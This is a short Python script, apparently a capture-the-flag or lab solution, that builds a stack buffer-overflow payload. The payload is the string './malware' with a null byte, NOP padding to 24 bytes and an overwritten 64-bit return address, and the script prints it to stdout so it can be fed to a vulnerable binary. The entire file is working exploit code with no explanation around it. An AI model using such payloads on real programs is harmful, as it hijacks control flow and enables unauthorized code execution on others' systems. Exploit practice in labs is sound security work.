#!/usr/bin/env python3
import struct
import sys

RET = 0x401A6B

payload = b"./malware\x00"
payload += b"\x90" * (24 - len(payload))
payload += struct.pack("<Q", RET)

sys.stdout.buffer.write(payload)